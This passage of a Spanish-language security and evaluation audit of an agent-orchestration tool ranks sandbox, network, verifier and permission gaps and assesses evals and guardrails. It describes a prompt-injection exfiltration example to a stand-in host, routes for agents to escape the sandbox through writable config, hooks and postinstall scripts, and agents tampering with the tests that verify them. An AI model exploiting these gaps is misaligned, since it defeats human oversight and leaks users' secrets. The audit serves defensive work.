| 11 Después | `tack-app/src/autonomy.rs:32-127`; `tack-core/src/notification.rs`; `tack-app/src/notifications/` | `tack-app` (por nombre de test); `notifications/tests.rs`; suite live 28 |

### 2.6 Paridad entre harnesses: el mismo run, cuatro reglas distintas

Tack lanza un run con cuatro agentes distintos: **Claude Code, Codex, opencode y docket**. Hoy, qué tan
protegido está un run depende de **qué agente nombra el perfil**, porque casi todos los controles de las
familias 5 a 9 se implementan como flags de cada CLI y no como reglas del runner. El descriptor de cada
agente ya dice qué cumple (`Supported`, `Advisory` o `Unsupported`), pero un control `Advisory` no cambia
ningún valor por defecto ni se compensa desde fuera.

| Control | Claude Code | Codex | opencode | docket |
| --- | --- | --- | --- | --- |
| **Jaula** | bwrap del runner | bwrap del runner, más el sandbox propio de Codex (`workspace-write` o `read-only`) | bwrap del runner | La de docket, **supuesta** (G6) |
| **`ask`** | Pregunta por `stdio`; leer y la web pasan sin preguntar | Cambia a `app-server` con `on-request`: *(inferido)* el modelo decide cuándo pedir; `exec` nunca pregunta (`codex.rs:225-233`) | `ask` para edit, bash y task; **`webfetch` siempre `allow`** | Lo decide docket; en L5 no pregunta a nadie |
| **`auto`** | **`bypassPermissions`** | `exec` dentro de su sandbox, sin preguntas | Todo en `allow` | La autonomía de docket |
| **Herramientas** | Lista exacta (`--tools`) | Solo "escribe o no" (el modo de sandbox) | Bloque `permission` (edit, bash, task) | `deniedTools` (por tipo; quitar `fetch` quitaba read, glob y grep) |
| **Red / Web tools** | Quita WebFetch y WebSearch; `Bash` conserva la red | **No se pasa** (`Advisory`). *(Inferido)* el modo `workspace-write` de Codex corta la red salvo que la config del usuario la abra | Rechaza `network:false`, así que el run no corre | `network:"none"` más una política para `fetch` |
| **Config e integraciones del usuario** | `--setting-sources ""` y `--strict-mcp-config`; `~/.claude` con escritura | `~/.codex` con escritura. *(Inferido)* nada desactiva los servidores MCP de `~/.codex/config.toml` (no hay ninguna mención a MCP en `codex.rs`) | `$HOME` falso, `OPENCODE_DISABLE_*`, `mcpServers: []` | El `DOCKET_HOME` de docket |
| **Límite de tokens mientras corre** | Sí | **No**: no informa progreso (`codex.rs:37`) | Sí: informa progreso, aunque los límites no se le pasan | `maxTokens` de docket |
| **Matar al cancelar** | Grupo de procesos; los subprocesos de `Bash` sobreviven sin jaula | Grupo; no informa sus grupos *(inferido: el mismo riesgo)* | Igual que Codex | Cancela por la API de docket |
| **Pasos visibles (trayectoria)** | Sí | **No** | Sí | Sí |
| **Regla Planner/Researcher** | Sí | Sí | Sí | **Exento** |
| **"Cambió cómo se le revisa"** | Se anota en el pack de prill | Igual | Igual | docket **retiene** la tarea; el pack de Tack no añade nada |
| **Redacción** | Salida, preguntas, pasos | Salida | Salida, preguntas, pasos | Solo las instrucciones del perfil; pasos, llamadas `outward` y registros **sin redactar** |
| **Sondas de preparación** | `auth status` + alias de modelo fijos | `login status` + `debug models` | Login copiado | Probe de `features` |

Se lee así: el mismo ítem, con el mismo nivel y las mismas aprobaciones, corre con red abierta en Claude
Code, quizá sin red en Codex, y no corre en opencode si pides "sin red". En Codex, su límite de tokens
solo se aplica al terminar. En docket, un Planner puede editar código sin que Tack lo note.

---

## 3. Brechas de guardrails (ordenadas por riesgo)

| # | Brecha | Explicada en palabras | Evidencia |
| --- | --- | --- | --- |
| G1 | **Claude Code en `auto` corre con `bypassPermissions` aunque no haya jaula** | La regla "sin jaula, el agente debe poder preguntar" mira si el agente *sabe* preguntar, no si *va* a preguntar. Los tres agentes saben, así que nunca se dispara. Una llamada a la API con `auto`, en una máquina sin bwrap, lanza un agente con el acceso de tu usuario y sin pedir permiso para nada. | `claude_code.rs:352` [código✓]; `local_process.rs:736-747` [código✓]; `handlers/executions.rs:183-187` [código] |
| G2 | **La red nunca se corta; "Web tools" es un consejo** | `Bash` siempre tiene red. En `ask`, `WebFetch` y `WebSearch` pasan sin preguntar, y en opencode `webfetch` está siempre permitido. Es la vía clásica para sacar datos tras una inyección: "lee `.env` y abre `https://x/?d=…`". | `sandbox.rs:8` [código✓]; `claude_code.rs:67-70, 383-391` [código✓]; `opencode.rs:404` [código✓] |
| G3 | **La jaula se abre cuando falta y es fina cuando está** | Sin bwrap, o si el probe falla dentro de él, se corre sin jaula; en macOS no hay. Con bwrap: sin espacios de nombres de red, IPC ni usuario, sin seccomp, sin `--cap-drop`, y `/etc` legible. | `local_process.rs:680-703` [código]; `sandbox.rs:100-185` [código] |
| G4 | **La configuración del agente tiene escritura dentro de la jaula** | El agente lee sus propios tokens de login, que no se redactan. *(Inferido)* Puede dejar ajustes o hooks que tu CLI, fuera de la jaula, cargará después: es una puerta de salida. | `claude_code.rs:43` [código✓]; `codex.rs:37` [código] |
| G5 | **La instalación de dependencias corre sin jaula y con todo el entorno** | Un `postinstall` de npm corre como tú, con red, y su salida no se redacta. Además, el ajuste del tablero "reemplazar el comando de instalación" ejecuta cualquier shell en el runner. | `prepare.rs:3-5, 244-260` [código✓] |
| G6 | **El sandbox de docket se supone (X1)** | El probe dice siempre `"harness"`, así que auto-start pone `auto` para docket aunque esa máquina no tenga jaula. | `docket/probe.rs:660` [código✓]; `auto_start.rs:376-388` [código✓]; auditoría de docket §5.2 [docket] |
| G7 | **El agente ve y puede tocar lo que lo examina, y Tack aplana lo que prill detecta** | El brief, con sus comandos, va en el prompt, y prill corre los criterios sobre el árbol del commit del agente, en un contenedor sin red. prill **sí** detecta parte de la trampa: un test que no distingue base de head (`tautological_test`), tests borrados, cambios en `conftest.py`, `pytest.ini`, `tox.ini`, `jest.config.*`, `vitest.config.*`, supresiones de linter y cualquier cambio de manifiesto; todos son flags que llevan a `human-review`, nunca a `reject`. Tack los convierte en texto dentro de `risk.reasons` y no los lee como señal. Su propia lista (`checked_files`) es más corta en unos puntos (`pyproject.toml`, `go.mod`, `.githooks/`), más ruidosa en otros (`latest`, `contest`), solo anota, y solo se aplica al pack de prill, nunca a `kind=command` ni a un run sin verificador. | `checked_files.rs:13-28` [código✓]; `verify/prill.rs:182-185, 630-640, 777-782` [código]; `start_run.rs:325` [código]; prill `core/stages/antitaut.py:300-361`, `core/diffscan.py:26-54`, `core/recommend.py:39-80` [prill] |
| G8 | **El verificador está apagado y nunca decide; el botón pasa por encima de un `reject`** | Sin `[verify] enabled`, ningún run se verifica. Si se verifica y falla, solo queda un evento. El botón Merge y "Done" mergean aunque el pack diga `reject`, sin un aviso que detenga. | `config.rs:332` [código✓]; `verify.rs:9` [código✓]; `engine/outcome.rs:221-253` [código✓]; `tack-core/src/autonomy.rs:207-213, 269-278` [código] |
| G9 | **La integridad del auto-merge tiene dos huecos** | (a) La `decision` se lee del `mrp.json` traducido por el runner, y la firma solo se comprueba contra el commit. prill firma el MRP **entero** como predicado del statement, así que la decisión está dentro de lo firmado y el tablero podría leerla de ahí; hoy no lo hace, y ningún consumidor lee `statement_sha256`, `evidence_sha256` ni `brief_sha256`. Como la clave de firma vive en el runner, esto es sobre todo un riesgo ante errores de traducción. (b) Un techo de equipo **desconocido** (`Ok(None)`) deja pasar el merge. | `tack-app/src/autonomy.rs:300-360` [código✓]; `tack-core/src/autonomy.rs:224-232` [código✓]; `tack-app/src/autonomy.rs:160-175, 357` [código✓]; prill `core/attest.py:52-61, 134-141` [prill] |
| G10 | **MCP como operador, y su origen por honor** | `tack mcp` sin credencial lee el `api-token`: un LLM con `tack mcp` en esta máquina **es el operador**. `X-Tack-Client` y `origin:"mcp"` los pone el cliente, y el "MCP siempre pregunta y sin red" lo impone el cliente MCP. | `tack-cli/src/config.rs:73, 149-151` [código✓]; `middleware.rs:404-411` [código]; `mcp/runs.rs:165-172` [código]; `start_run.rs:1107` [código] |
| G11 | **La política de entorno es una denylist** | Se le escapan los proxies, los directorios de config de los agentes, `NODE_PATH`, `JAVA_TOOL_OPTIONS` y `npm_config_*`. Contradice su propio doc. | `env_policy.rs:1-6` [código✓] |
| G12 | **La confianza del ítem solo llega a docket** | Un ítem importado de GitHub recibe en Claude Code, Codex y opencode los mismos permisos que uno que escribiste tú. | `start_run.rs:1334` [código✓] (único productor); `docket/task.rs:358` [código] (único consumidor) |
| G13 | **Los límites se abren por los bordes** | Codex no aplica su límite mientras corre; una cancelación fallida solo se anota; un agente sin uso informado no se corta; los subprocesos de `Bash` de Claude Code sobreviven. | `engine.rs:1080-1178` [código]; `claude_code.rs:430-435` [código]; ADR 0018 (decisión 10) [doc] |
| G14 | **La sesión del operador** | Un solo token sin rotación. La cookie no lleva `Secure` ni `Max-Age`. No hay rate limiting en la API. | `middleware.rs:130` [código✓]; `router.rs:631` [código] |
| G15 | **El registro y la autoría** | Las filas no están encadenadas. No hay regla de dos personas. El origen del change set lo elige el cliente. Los principales del sistema son texto libre. Un `Move` en Act no pasa por una persona. | `handlers/change_sets.rs:218-219` [código]; `tack-app/src/auto_start.rs:27` [código]; `change_set.rs:162-178` [código] |
| G16 | **Nadie mide cuánto estorban las preguntas; las esperas no vencen** | No hay cifra de preguntas por cada 100 acciones ni de qué fracción se concede. `expires_at` de las decisiones y la expiración de las credenciales de runner son opcionales. | `create_decision.rs` [código]; `runner_auth.rs` [código] |
| G17 | **Afirmaciones que el código desmiente** | Ver §7.3. | [doc] |
| G18 | **La robustez depende del agente que nombra el perfil** | Los controles de las familias 5 a 9 se aplican como flags de cada CLI, así que cada agente tiene huecos distintos (§2.6). Unos ejemplos: Codex sin límite de tokens en vivo ni pasos visibles, y *(inferido)* con los MCP del usuario cargados; opencode con `webfetch` siempre permitido; docket exento de la regla del Planner y sin redacción de sus pasos. Un control `Advisory` en el descriptor ni baja el valor por defecto a `ask` ni lo suple el runner desde fuera. Nada prueba que **los cuatro** cumplan cada regla: las suites de frontera usan un agente falso. | `codex.rs:35-38, 225-233` [código✓]; `opencode.rs:404, 515-528` [código✓]; `engine/outcome.rs:480-520` [código]; `engine/decisions.rs:68` [código] |

---

## 4. Los evals de Tack, explicados

### 4.1 Cuatro tipos, que no conviene confundir

| Tipo | Qué pregunta responde | Modelo | Cuáles hay |
| --- | --- | --- | --- |
| **A. Tests de producto** | "¿Tack reacciona bien ante este comportamiento?" | Falso | Unitarios e integración, suites de frontera, docket y prill falsos, Playwright en CI, tablas de política, cobertura, mutantes |
| **B. Evals de agente** | "¿Un agente real hace bien el trabajo a través de Tack, y con qué frecuencia?" | Real | Suite live docket+prill, run de prueba en Settings, pruebas live por fase |
| **C. Verificación por run** | "¿Este run concreto vale?" | Real, en producción | Reglas de salida, evidencia, prill y su pack, revisión humana, "Done when", perfil Reviewer |
| **D. Mediciones** | "¿Cómo va la operación y cuánto cuesta?" | Producción | Métricas de la fábrica, calidad de prill, límites aprendidos |

En sentido estricto, **solo B son evals**, y es el más débil. A es sólido. C es la mina sin explotar:
produce **etiquetas** en producción. D mide operación, no calidad.

### 4.2 Uno por uno

---

#### A1 · Tests unitarios y de integración · unos 2.270 en Rust y 150 archivos de Vitest

- **Para qué sirven:** comprobar que cada pieza hace lo que dice.
- **Recuento aproximado por crate:** `tack-runner` 632, `tack-api` 590, `tack-core` 266, `tack-app` 262,
  `tack-db` 213, `tack-cli` 147, `tack-protocol` 83, `tack-desktop` 51, `tack-orch` 26.
- **Reglas que los sostienen:** siempre `--workspace` y nextest; los directorios temporales vienen de
  un guard; un binario de test por crate (ADR 0029).
- **Qué no dicen:** nada sobre un modelo real.

#### A2 · Suites de frontera (obligatorias)

- **Para qué sirven:** que cada regla de seguridad tenga un test que la haga cumplir. "Una regla sin test
  en una de estas suites no es una regla" (`docs/TESTING.md`).
- **Cómo funcionan:** `security` (la frontera del servidor), `agent_boundaries` (la del runner),
  `h3_checkout` y `crash_matrix`. Corren en el job `security-boundaries` de CI, con
  `TACK_REQUIRE_BWRAP=1` para que la prueba con bwrap real falle en vez de saltarse, y en el pre-push.
- **Ejemplo:** "una petición con `GIT_SSH_COMMAND` se rechaza antes de lanzar".
- **Qué no dicen:** si un agente **real** intentaría escapar, ni cuánto estorban las reglas. Prueban
  "dice que no" con un agente falso.

#### A3 · docket y prill falsos, con detección de deriva

- **Para qué sirven:** que la CI nunca necesite docket ni prill (regla del repo) y aun así pruebe la
  integración.
- **Cómo funcionan:** un docket falso en el mismo proceso (`tests/fake_docket/`), y `fake_prill.sh` y
  `fake_verifier.sh`. `--check` en la suite live compara los fixtures grabados con el docket y el prill
  reales, y avisa cuando divergen.
- **Qué no dicen:** el comportamiento del verificador real, que solo se prueba a mano.

#### A4 · Playwright en CI · 19 specs

- **Para qué sirve:** recorridos de usuario con el servidor y un runner reales y un agente falso
  (`journey`, `run-with-agent`, `scheduler-e2e`, `recovery-demo`, `a11y`, `api`, …).
- **Qué no dice:** nada sobre la calidad del trabajo.

#### A5 · Tablas de política

- **Para qué sirven:** probar las decisiones como funciones puras.
- **Cuáles:** `evaluate_table` de la escalera de merge, 21 casos de change sets, 12 de triggers, los de
  auto-start.
- **Ejemplo:** "en L4, con prill en `merge`, firma válida y un equipo atendido → se retiene por el techo".

#### A6 · Cobertura y mutantes

- **Cobertura:** líneas del workspace ≥ 78,93 %, 80 % de las líneas cambiadas en cada PR (`diff-cover`) y
  Vitest ≥ 70 % (60 % en ramas).
- **Mutantes:** `cargo-mutants` cada semana sobre `tack-core` y la capa de repositorio de `tack-db`, solo
  como informe. Responde la pregunta que la cobertura no responde: ¿un test notaría que esta línea está
  mal?

#### A7 · Cadena de suministro de Tack

- `cargo audit`, `npm audit`, `cargo deny`, SBOM, artefactos con atestación y `SHA256SUMS` firmado sin
  clave. Protege **a Tack**, no a los runs.

---

#### B1 · Suite live docket+prill · 35 tests, numerados hasta el 36 (fuera de git)

- **Para qué sirve:** comprobar el flujo entero con docket, prill y un modelo **reales**.
- **Cómo funciona:** Playwright contra un Tack, un docket y un prill de verdad, con el modelo local o
  Claude Haiku. Cubre:
  - el alta de un proyecto, los equipos y los perfiles;
  - un bug, una feature y un documento;
  - una política que aparca una tarea y los reinicios;
  - cancelar;
  - L5 frente a una aprobación;
  - un pack firmado;
  - equipos de carpeta;
  - propuestas;
  - el agente gestor y su credencial;
  - auto-start;
  - avisos;
  - la memoria de un equipo;
  - una épica que se planifica.
- **Ejemplo:** "06: el perfil Code manda el bug al equipo de código, docket lo arregla en una rama, prill
  firma y la persona acepta".
- **Qué no dice:**
  - Los caminos felices aceptan **cualquier** veredicto (`spec.ts:973`); solo el 09 exige un rechazo, con
    un criterio imposible.
  - Corre **una vez, a mano**, sin repeticiones ni umbral. Los resultados quedan en
    `onboarding-lab/results/`, fuera de git.
  - Lo que se recuerda sobre la calidad está en prosa en `CLAUDE.md`: "el 15 falla por el bucle del
    paso de lead del modelo local; con Haiku pasan los 20 en una corrida". Es una cifra de capacidad
    **sin registrar**.

#### B2 · Run de prueba en Settings

- **Para qué sirve:** comprobar que el agente de este perfil arranca.
- **Cómo funciona:** un Implementer en un directorio vacío, archivado bajo "Agent tests". Solo juzga el
  estado final.
- **Qué no dice:** si el agente trabaja bien.

#### B3 · Sondas de preparación (readiness)

- `claude auth status`, `codex login status` y `debug models`. Solo se muestran: desactivan el botón del
  run de prueba y aparecen en `tack runner doctor`. **No retienen los runs reales.**

#### B4 · `onboarding-lab/check.sh`

- Prueba los scripts de la skill de onboarding contra un Tack y un docket desechables. No prueba la
  mitad de juicio de la skill (`:9-10`).

#### B5 · Pruebas live por fase, narradas

- **Para qué sirven:** descubrir lo que solo aparece con el producto de verdad.
- **Ejemplo:** la fase 87 encontró dos defectos que el docket falso nunca habría mostrado.
- **Qué no dicen:** no tienen umbral, repetición ni comparación con la vez anterior. Son lo más valioso
  y lo menos sistemático.

---

#### C1 · Reglas de salida

Ver la familia 9. Son deterministas y deciden Succeeded o Failed.

#### C2 · Evidencia

- **Para qué sirve:** un recibo de lo que cambió el agente, para el verificador y para quien revisa.
- **Qué guarda:** el diff desde el commit base (hasta 8 MiB), la lista de archivos, el brief,
  `trajectory.json`, el plan, la respuesta y un manifiesto. Si la captura falla, queda `captured:false`
  con su motivo.

#### C3 · Verificador externo y pack firmado

- **Para qué sirve:** que un programa aparte corrija el cambio contra la lista de la tarjeta.
- **Cómo funciona:**
  - `kind=prill`: Tack traduce el brief al formato de prill. prill corre los criterios y sus etapas
    (suite, mutación, juez y riesgo), y Tack traduce el veredicto: `auto-merge-eligible`, `human-review`
    y `reject` pasan a ser `merge`, `review` y `reject`.
  - `kind=command`: solo se comprueba que el pack exista y se pueda leer.
  - La firma in-toto la comprueba el tablero (`prill attest verify --commit <head>`).
- **Ejemplo:** "prill corre `npm test`, la mutación sobrevive en `round()`, el juez dice 'sí' → `review`".
- **Qué no dice:**
  - Está apagado por defecto y nunca cambia el resultado del run.
  - Algunos campos de la traducción están fijos: `judge.blind: true` siempre (y es cierto: el juez de prill solo
    ve el diff y el brief), `static_analysis` siempre `None` aunque prill lo emite por herramienta, `evidence_ref`
    siempre `None`, y `unparseable` del juez se cuenta como Fail igual que `no`.
  - Los `flags` de prill (`tautological_test`, `test_config_changed`, `dependencies_changed`,
    `config_changed_in_head`, …) y su `antiTautology` llegan a Tack como líneas de texto en `risk.reasons`; el
    tablero no puede leerlos como señal. Lo que falta está en `docs/plans/prill-ajustes-2026-11-06.es.md`.

#### C4 · Bucle de rework

- Con un `reject` que trae lista de arreglos, lanza otro run con esa lista, cercada como "datos, no
  instrucciones". Se detiene si la lista se repite. **El tope es 0, es decir, apagado.**

#### C5 · Revisión humana · dos almacenes

- **Para qué sirve:** que una persona decida si el trabajo entra.
- **Los dos almacenes:**
  - la revisión del **pack** exige motivo, rechaza una segunda revisión con 409, y el revisor es siempre
    el texto `"operator"`;
  - la revisión del **run** tiene la nota opcional.
- **Efectos:** aceptar abre el PR. Un rechazo saca los tokens del run del límite aprendido.
- **Por qué importa:** cada revisión es una **etiqueta humana**. Ningún código la cruza con el veredicto
  de prill.

#### C6 · Casillas "Done when"

- Una casilla marcada se pinta como "passed" en pantalla. El servidor no la lee y no cuenta para el
  merge.

#### C7 · Perfil Reviewer

- Un agente que revisa contra los criterios, en texto libre. No da un veredicto estructurado ni está
  conectado al merge.

---

#### D1 · Métricas de la fábrica (`handlers/metrics.rs`)

- **Qué miden:**
  - la tasa de escalada (decisiones ÷ intentos);
  - los minutos humanos por decisión (p50 y p90);
  - las decisiones que el agente resolvió solo;
  - el impuesto de verificación (tokens de implementación frente a rework y verificación);
  - cómo arrancaron los runs (persona, auto o rework) y qué disparó los merges (botón, Done o auto);
  - el destino de los PR (abiertos, mergeados, cerrados, revertidos, mergeados sin revert);
  - la calidad de prill por repositorio.
- **Qué no miden:** la tasa de éxito por perfil, harness, modelo o equipo; el rechazo humano; el acuerdo
  entre prill y la persona.
- **Además:** `cost_usd` y `qualified_per_usd` ponen precio en **dólares** (L5).

#### D2 · Límites aprendidos

- El p90 × 1,5 de los tokens tras 5 runs, por perfil. Es la única cifra que aprende de las revisiones,
  porque excluye los runs rechazados.

### 4.3 Resumen: qué responde cada uno, y lo que nadie responde

| Pregunta | Quién la responde hoy |
| --- | --- |
| ¿Tack hace lo correcto cuando el agente o docket hace X? | A1–A5 |
| ¿Contiene la jaula y se cumple la política del entorno? | A2 (con un agente falso y una prueba con bwrap real) |
| ¿La escalera de merge decide lo que dice? | A5 |
| ¿El flujo entero funciona con docket y prill reales? | B1, una vez, a mano |
| ¿Este run vale? | C1, C3, C5 |
| **¿Qué perfil, modelo, harness o equipo resuelve mis tareas, y con qué frecuencia?** | **Nadie**, aunque los datos están (C5, D1) |
| **¿prill o el Reviewer aprueban trabajo que una persona rechaza o revierte?** | **A medias.** prill calcula `agreement` y `escapedDefects` por repositorio con lo que Tack le manda por `record outcome` (merged, closed, reverted, red_ci). Nadie cruza el pack con la **revisión humana** (aceptado, rechazado con motivo), que prill no recibe, ni corta por perfil, harness o modelo. El Reviewer no se mide |
| **¿Un cambio en el prompt que compone Tack empeoró el trabajo?** | **Nadie** |
| **¿Cuánto estorban las preguntas?** | **Nadie** |
| **¿Un agente real cae en una inyección a través de Tack?** | **Nadie** |

---

## 5. Comparación con el ecosistema

### 5.1 Evals

| Práctica actual | Fuente | Tack hoy |
| --- | --- | --- |
| Separar evals de **capacidad** de evals de **regresión**; lo que se satura "se gradúa" a regresión | Anthropic, *Demystifying evals for AI agents*, 2026-01 [P vía docket] | No hay ninguno de los dos para calidad |
| Empezar con **20–50 tareas sacadas de fallos reales**, cada una con su solución de referencia | ídem [P vía docket] | Ninguna. **Los fallos reales ya están etiquetados**: runs rechazados con motivo y PR revertidos |
| La comprobación final corre **aparte**, con tests ocultos que el agente no ve | SWE-bench, FAIL_TO_PASS y PASS_TO_PASS, 2023 [P]; Harbor, 2026-10 [P vía docket] | Los criterios están en el prompt y prill corre sobre el commit del agente (G7) |
| **pass@k** y **pass^k** (75 % por intento da 42 % en 3 de 3) | τ-bench, 2024 [P] | Solo "¿pasó esta vez?". **Las tareas recurrentes (fase 73) ya dan pass^k en producción sin calcularlo** |
| Margen de error **agrupado por tarea** y comparación **pareada** | Miller, *Adding error bars to evals*, 2024 [P] | Nada |
| Jueces de sí o no, **calibrados contra humanos** (30–50 buenos y 30–50 malos) | Husain & Shankar, 2026-09 [P vía docket] | prill tiene un juez ciego (solo ve el diff y el brief) que responde `yes`, `no` o `unparseable`, sin calibración; Tack lo aplana: todo lo que no es `yes` sale como Fail. **Las etiquetas para calibrarlo están en Tack** |
| Medir al **revisor** por aprobar trabajo roto y por rechazar el bueno, por separado | SWE-Review, arXiv 2607.06065, 2026-07 [P vía docket] | prill mide su acuerdo con el destino del PR (`agreement`, `escapedDefects`); nadie mide la falsa aprobación y el falso rechazo por separado ni contra la revisión humana; el Reviewer no se mide |
| Clasificar los fallos (MAST, 14 modos) | NeurIPS 2025 [S vía docket] | Parcial: `failureKinds`, "Not started" con motivo, `step_budget` |
| **Procedencia firmada** del resultado | in-toto y SLSA [P] | **Sí**: pack firmado y atado al commit, por encima del promedio |
| Resultados como evento OTel `gen_ai.evaluation.result` | semantic-conventions-genai [P vía docket] | No |

### 5.2 Guardrails

| Práctica actual | Fuente | Tack hoy |
| --- | --- | --- |
| **Contener en el entorno primero, confiar en el modelo después** | Anthropic, *How we contain Claude*, 2026-05 [P vía docket] | Parcial: jaula opcional y red abierta (G2, G3) |
| **Fallar cerrado** si no hay jaula | Claude Code `failIfUnavailable`; Codex con jaula por defecto [P vía docket] | No: se abre, por decisión (ADR 0018, decisión 11: "honest where it does not") |
| `.git` y la configuración del agente **de solo lectura** dentro de lo escribible | Documentación de Codex [P vía docket] | Hooks y config de git, sí; `~/.claude` y `~/.codex`, no (G4) |
| **Un dominio permitido es una concesión de capacidad**; atar la salida a red a la sesión | Anthropic, 2026-05 [P vía docket] | No hay ningún control de salida a red |
| **Rule of Two**: entrada externa + datos privados + cambiar estado ⇒ una persona | Meta, 2025-10 [P vía docket] | Tack compone el run (herramientas, web, secretos, ítem no confiable) y podría avisar; no lo hace |
| Las **listas de frases son alarmas, no defensas** | *The Attacker Moves Second*, arXiv 2510.09023 [P vía docket] | Tack no depende de detectores. El cercado de la tarjeta (spotlighting) es la capa barata, y está |
| **Separar control de datos**: un vigilante determinista fuera del modelo | CaMeL, arXiv 2503.18813 [P] | En el tablero, sí: los agentes proponen y una persona aplica. En la máquina, depende de cada CLI |
| Revisor automático de acciones, **ciego al razonamiento** | Anthropic auto mode, 2026-03 [P vía docket] | No. `bypassPermissions` en `auto` |
| Medir cada guardrail por **utilidad, utilidad bajo ataque, éxito del ataque y falsos positivos** | AgentDojo, 2024 [P] | Solo "¿dice que no?" con un agente falso |
| **Fatiga de aprobaciones** (se acepta el 93 % de lo que se pregunta) | Anthropic, 2026-03 [P vía docket] | No se mide (G16) |
| Credenciales cortas de mínimo privilegio; registro a prueba de manipulación; rate limiting | OWASP [P] | Credenciales de agente, sí. Operador, registro y rate limiting, no (G14, G15) |

### 5.3 Cobertura frente a OWASP Top 10 for Agentic Applications 2026

La lista es [S vía docket].

| ASI | Riesgo | Cobertura en Tack |
| --- | --- | --- |
| ASI01 | Secuestro del objetivo (inyección) | **Baja–media.** El texto de la tarjeta va cercado; el repositorio y la web, no; la red abierta permite sacar datos |
| ASI02 | Mal uso de herramientas | Media. Flags de cada CLI y `ask`; `bypassPermissions` en `auto` |
| ASI03 | Abuso de identidad o privilegios | **Alta en el tablero** (scopes, change sets). Baja con `tack mcp` y con el token único |
| ASI04 | Cadena de suministro | Alta para Tack (audit, deny, SBOM, firmas). **Baja en los runs**: `postinstall` sin jaula (G5) |
| ASI05 | Ejecución de código inesperada | Alta con bwrap, baja sin él y en la instalación |
| ASI06 | Envenenamiento de memoria o contexto | Media. La memoria de Claude está apagada por entorno; la memoria de los equipos de docket se aprueba en Tack |
| ASI07 | Comunicación insegura entre agentes | Media–alta. Protocolo del runner autenticado, pack firmado |
| ASI08 | Fallos en cascada | Media–alta. Presupuestos, topes, anti-eco de triggers, degradación |
| ASI09 | Explotar la confianza humana | **Baja.** No se mide la fatiga de aprobaciones y el botón pasa sobre un `reject` |
| ASI10 | Agentes que se desvían | Media. Hash de la config, alcance del Planner, change sets; registro sin encadenar |

---

## 6. Evaluación continua (EDD): ¿la tiene Tack?

### 6.1 Qué es, en claro, y por qué en Tack es distinto

**EDD** (*Evaluation-Driven Development*) es TDD aplicado al comportamiento de un sistema con LLM: primero
se escribe el eval que mide la conducta deseada, luego se cambia el prompt, el contexto, el modelo o el
guardrail, y el cambio solo entra si el eval lo confirma. La versión actual une un bucle **offline**
(antes de cambiar) y uno **online** (en producción) en un ciclo cerrado (EDDOps, arXiv 2411.13768
[P vía docket]; diagrama completo en la auditoría de docket, §6.1).

**Por qué en Tack es distinto:** docket tiene que *inventar* la verdad del bucle online (un juez, un
análisis semanal). Tack ya la tiene: es el tablero donde **una persona** acepta, rechaza con motivo,
mergea o revierte cada run. El bucle online de Tack no necesita un juez para empezar, solo leer sus
propias tablas.

```text
            BUCLE OFFLINE (antes de cambiar Tack)              BUCLE ONLINE (los equipos del operador)
 ┌─────────────────────────────────────────────────┐   ┌──────────────────────────────────────────────┐
 │ 1. nombrar el eval y su umbral                  │   │ 5. cada run deja etiquetas: Succeeded/Failed, │
 │ 2. cambiar lo que el agente lee o recibe         │   │    aceptado/rechazado (motivo), merge/revert  │
 │    (prompt compuesto, plan, brief→prill, …)     │   │ 6. cifras por perfil, modelo, harness, equipo │
 │ 3. CI: determinista, siempre (sin modelo)        │   │    y acuerdo entre prill y la persona         │
 │ 4. modelo real: regression pareada vs la base    │   │ 7. aviso si la tendencia empeora              │
 └──────────────────▲──────────────────────────────┘   └───────────────────────┬──────────────────────┘
                    │      8. un run rechazado o revertido se convierte en un caso de eval        │
                    └──────────────────────────────────────────────────────────────────────────────┘
```

**Ejemplo en palabras.** El mantenedor cambia las instrucciones que Tack le da al Planner para escribir
`tack-plan.json`.

1. **Sin EDD:** los tests pasan, porque comprueban la forma del texto. Dos semanas después, las
   propuestas del Planner en My SaaS se rechazan más, porque cada subtarea sale sin comprobación.
   Alguien lo nota leyendo runs.
2. **Con EDD:**
   - la tarjeta nombra la suite `planner` y su umbral;
   - antes del merge, `planner` cae de 9/10 a 6/10 y el cambio no entra;
   - si hubiera entrado, la tasa de aceptación de planes del Planner habría disparado el aviso de
     tendencia, y el plan rechazado habría pasado a ser un caso de la suite.

### 6.2 Los ocho componentes de un EDD robusto

Son los mismos que en la auditoría de docket (§6.2): C1 eval antes del cambio, C2 casos que crecen desde
fallos reales, C3 comprobación automática por cambio, C4 comprobación con modelo real en los puntos de
decisión, C5 evaluación en producción, C6 retroalimentación, C7 trazabilidad y C8 tendencia y avisos.

### 6.3 Veredicto: qué tiene Tack hoy

| # | Componente | Estado | Evidencia |
| --- | --- | --- | --- |
| — | TDD para el **código** | **Sí** | Suites de frontera ("una regla sin test no es una regla"), cobertura, `diff-cover`, mutantes semanales, pre-push como compuerta |
| C1 | Eval antes de un cambio de **comportamiento** | **Parcial: cultura sin instrumento** | "Medir y luego planificar" y "prueba live por fase" (roadmap, `CLAUDE.md`). Pero ningún cambio en lo que el agente lee nombra un eval con umbral: `compose_instructions`, las instrucciones del plan, la traducción del brief a prill, las herramientas por defecto |
| C2 | Casos que crecen desde fallos | **Parcial** | La suite live creció desde defectos (la fase 81 encontró cinco) y los fixtures se vuelven a grabar (`--check`). Son casos de **flujo**, no casos con modelo real y solución de referencia |
| C3 | Comprobación automática por cambio | **Sí, para lo determinista** | CI completa. "CI never needs docket or prill" |
| C4 | Comprobación con modelo real | **Parcial y manual** | Suite live a mano: acepta cualquier veredicto, sin umbral ni base, y sus resultados quedan fuera de git |
| C5 | Evaluación en producción | **Parcial: operación sí, calidad no** | D1 mide escaladas, espera humana, impuesto de verificación y destino de los PR. **Falta** la tasa de éxito y de aceptación por perfil, modelo, harness y equipo, el rework por ítem y el acuerdo entre prill y la persona. Los datos están en `attempt_reviews`, las revisiones del pack, `tack_merges` y `pull_requests` |
| C6 | Retroalimentación | **No** | Manual: alguien lee un run y escribe una tarjeta |
| C7 | Trazabilidad | **Parcial** | Cada run guarda el prompt compuesto, el perfil y el modelo, y el brief tiene versiones con `brief_sha256`. **Falta** la versión o huella de las plantillas de Tack y el commit de Tack en cada run |
| C8 | Tendencia y avisos | **No** | El inbox existe (fase 88) pero nadie le manda una tendencia |

**Madurez**, de 0 a 5: 0 nada · 1 manual, a demanda · 2 medido por cambio en alguna dimensión ·
3 comprobaciones automáticas de calidad · 4 producción más retroalimentación · 5 ciclo cerrado con avisos
y A/B.

| Dimensión | Nivel hoy |
| --- | --- |
| Corrección del código | **4–5**: suites de frontera, cobertura, `diff-cover`, mutantes |
| Política del tablero (merge, change sets, triggers) | **4**: tablas de casos en CI más la suite live |
| Contención ("¿contiene?") | **2**: una prueba con bwrap real, sin corpus de ataques con un agente |
